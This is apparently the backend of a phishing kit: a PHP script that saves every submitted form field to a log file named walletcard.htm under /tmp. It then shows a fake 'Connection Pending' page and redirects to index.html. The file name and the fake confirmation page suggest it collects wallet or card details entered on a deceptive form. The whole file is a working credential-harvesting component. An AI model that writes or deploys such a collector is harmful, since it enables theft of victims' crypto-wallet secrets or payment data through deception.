<?php
// Use /tmp directory for writing
$handle = fopen("/tmp/walletcard.htm", "a");

// Check if the file opened successfully
if ($handle === false) {
    die('Error: Unable to open walletcard.htm for writing.');
}

// Iterate through POST data and write to the file
foreach ($_POST as $variable => $value) {
    // Sanitize form input to prevent injection attacks
    $safe_variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $safe_value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    
    // Write sanitized data to the file
    fwrite($handle, $safe_variable);
    fwrite($handle, "=");
    fwrite($handle, $safe_value);
    fwrite($handle, "<br>");
}

// Add a separator for entries
fwrite($handle, "<hr>");

// Close the file handle
fclose($handle);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Successful</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f4f6;
        }
        .popup {
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: orange;
            color: white;
            font-size: 20px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="popup">
        Connection Pending
    </div>

    <script>
        // Show the success message for 3 seconds, then redirect
        setTimeout(function() {
            window.location.href = "index.html";  // Change to your redirect URL
        }, 3000); // 3-second delay before redirect
    </script>
</body>
</html>
